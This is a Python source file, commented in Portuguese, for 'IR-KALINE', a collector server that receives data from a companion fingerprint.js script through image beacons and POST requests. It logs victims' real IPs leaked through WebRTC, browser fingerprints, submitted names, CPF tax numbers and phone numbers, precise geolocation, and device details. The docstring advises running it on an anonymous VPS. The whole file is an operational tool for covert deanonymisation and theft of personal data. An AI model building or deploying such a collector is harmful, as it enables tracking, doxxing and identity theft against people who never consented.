#!/usr/bin/env python3
"""
IR-KALINE - Servidor de Coleta de Dados
=======================================
Recebe dados de fingerprint.js e IP leak
Uso: python3 collector.py

IMPORTANTE: Execute em VPS anonima!
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import json
import base64
from datetime import datetime
import os
import ssl

# ============================================
# CONFIGURACAO
# ============================================
HOST = '0.0.0.0'
PORT = 8443
LOG_FILE = 'collected_data.json'
ENABLE_SSL = False  # True para HTTPS (requer cert.pem e key.pem)

# ============================================
# CORES TERMINAL
# ============================================
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# ============================================
# HANDLER HTTP
# ============================================
class CollectorHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        """Silencia logs padrao"""
        pass

    def _send_cors_headers(self):
        """Headers CORS para aceitar qualquer origem"""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.send_header('Access-Control-Max-Age', '86400')

    def do_OPTIONS(self):
        """Responde preflight CORS"""
        self.send_response(200)
        self._send_cors_headers()
        self.end_headers()

    def do_GET(self):
        """Recebe dados via GET (image beacon)"""
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        if 'data' in params:
            try:
                data = json.loads(base64.b64decode(params['data'][0]))
                self._process_data(data, 'GET')
            except Exception as e:
                print(f"{Colors.RED}[-] Erro decodificando GET: {e}{Colors.RESET}")

        # Retorna pixel 1x1 transparente
        self.send_response(200)
        self._send_cors_headers()
        self.send_header('Content-Type', 'image/gif')
        self.end_headers()
        # GIF 1x1 transparente
        self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')

    def do_POST(self):
        """Recebe dados via POST"""
        content_length = int(self.headers.get('Content-Length', 0))

        if content_length > 0:
            try:
                body = self.rfile.read(content_length)
                data = json.loads(body.decode('utf-8'))
                self._process_data(data, 'POST')
            except Exception as e:
                print(f"{Colors.RED}[-] Erro processando POST: {e}{Colors.RESET}")

        self.send_response(200)
        self._send_cors_headers()
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status": "ok"}')

    def _process_data(self, data, method):
        """Processa e salva dados coletados"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        client_ip = self.client_address[0]

        # Adicionar metadados
        data['_metadata'] = {
            'received_at': timestamp,
            'client_ip': client_ip,
            'method': method,
            'headers': dict(self.headers)
        }

        # Exibir no terminal
        self._display_data(data)

        # Salvar em arquivo
        self._save_data(data)

    def _display_data(self, data):
        """Exibe dados formatados no terminal"""
        print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}[+] NOVA CAPTURA - {data.get('_metadata', {}).get('received_at')}{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*60}{Colors.RESET}")

        # IP Capturado
        meta = data.get('_metadata', {})
        print(f"{Colors.YELLOW}[IP CONEXAO]{Colors.RESET} {meta.get('client_ip')}")

        # WebRTC IPs (IP REAL)
        webrtc_ips = data.get('webrtcIPs', [])
        if webrtc_ips:
            print(f"{Colors.RED}[WEBRTC IPs - REAL!]{Colors.RESET}")
            for ip in webrtc_ips:
                print(f"  -> {Colors.BOLD}{ip}{Colors.RESET}")

        # Fingerprint
        fp = data.get('fingerprint', {})
        if fp:
            print(f"{Colors.YELLOW}[FINGERPRINT]{Colors.RESET} {fp.get('visitorId', 'N/A')}")

        # Dados do Formulario
        form = data.get('formData', {})
        if form:
            print(f"\n{Colors.CYAN}[DADOS FORMULARIO]{Colors.RESET}")
            print(f"  Nome:     {form.get('nome', 'N/A')}")
            print(f"  CPF:      {Colors.BOLD}{form.get('cpf', 'N/A')}{Colors.RESET}")
            print(f"  Telefone: {Colors.BOLD}{form.get('telefone', 'N/A')}{Colors.RESET}")

        # Geolocalizacao
        geo = data.get('geolocation', {})
        if geo and 'latitude' in geo:
            print(f"\n{Colors.CYAN}[GEOLOCALIZACAO]{Colors.RESET}")
            print(f"  Latitude:  {geo.get('latitude')}")
            print(f"  Longitude: {geo.get('longitude')}")
            print(f"  Precisao:  {geo.get('accuracy')}m")
            print(f"  Google Maps: https://maps.google.com/?q={geo.get('latitude')},{geo.get('longitude')}")

        # Device Info
        print(f"\n{Colors.CYAN}[DEVICE INFO]{Colors.RESET}")
        print(f"  User-Agent: {data.get('userAgent', 'N/A')[:80]}...")
        print(f"  Plataforma: {data.get('platform', 'N/A')}")
        print(f"  Tela: {data.get('screen', {}).get('width', 'N/A')}x{data.get('screen', {}).get('height', 'N/A')}")
        print(f"  Timezone: {data.get('timezone', {}).get('name', 'N/A')}")

        # Conexao
        conn = data.get('connection', {})
        if conn:
            print(f"  Conexao: {conn.get('effectiveType', 'N/A')} ({conn.get('downlink', 'N/A')} Mbps)")

        # Stage
        print(f"\n{Colors.YELLOW}[STAGE]{Colors.RESET} {data.get('stage', 'unknown')}")
        print(f"{Colors.GREEN}{'='*60}{Colors.RESET}\n")

    def _save_data(self, data):
        """Salva dados em arquivo JSON"""
        try:
            # Carregar dados existentes
            existing = []
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r') as f:
                    existing = json.load(f)

            # Adicionar novo
            existing.append(data)

            # Salvar
            with open(LOG_FILE, 'w') as f:
                json.dump(existing, f, indent=2, ensure_ascii=False)

            print(f"{Colors.GREEN}[+] Dados salvos em {LOG_FILE}{Colors.RESET}")

        except Exception as e:
            print(f"{Colors.RED}[-] Erro salvando: {e}{Colors.RESET}")

# ============================================
# MAIN
# ============================================
def main():
    print(f"""
{Colors.RED}
 ██╗██████╗       ██╗  ██╗ █████╗ ██╗     ██╗███╗   ██╗███████╗
 ██║██╔══██╗      ██║ ██╔╝██╔══██╗██║     ██║████╗  ██║██╔════╝
 ██║██████╔╝█████╗█████╔╝ ███████║██║     ██║██╔██╗ ██║█████╗
 ██║██╔══██╗╚════╝██╔═██╗ ██╔══██║██║     ██║██║╚██╗██║██╔══╝
 ██║██║  ██║      ██║  ██╗██║  ██║███████╗██║██║ ╚████║███████╗
 ╚═╝╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝
{Colors.RESET}
{Colors.CYAN}        [ DATA COLLECTOR SERVER ]{Colors.RESET}
{Colors.YELLOW}        Neural OffSec Team - 2024{Colors.RESET}
    """)

    server = HTTPServer((HOST, PORT), CollectorHandler)

    if ENABLE_SSL:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain('cert.pem', 'key.pem')
        server.socket = context.wrap_socket(server.socket, server_side=True)
        protocol = 'HTTPS'
    else:
        protocol = 'HTTP'

    print(f"{Colors.GREEN}[+] Servidor iniciado em {protocol}://{HOST}:{PORT}{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Aguardando conexoes...{Colors.RESET}\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Servidor encerrado{Colors.RESET}")
        server.shutdown()

if __name__ == '__main__':
    main()
